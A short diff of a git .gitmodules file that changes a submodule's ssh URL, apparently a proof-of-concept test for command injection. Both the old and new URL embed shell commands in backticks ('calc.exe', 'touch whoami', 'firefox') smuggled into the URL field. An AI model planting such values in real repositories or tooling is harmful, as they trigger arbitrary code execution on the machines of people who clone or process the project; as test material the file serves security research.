@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`calc.exe | firefox`foo.example.com/bar
+	url = ssh://`touch whoami | firefox`foo.example.com/bar
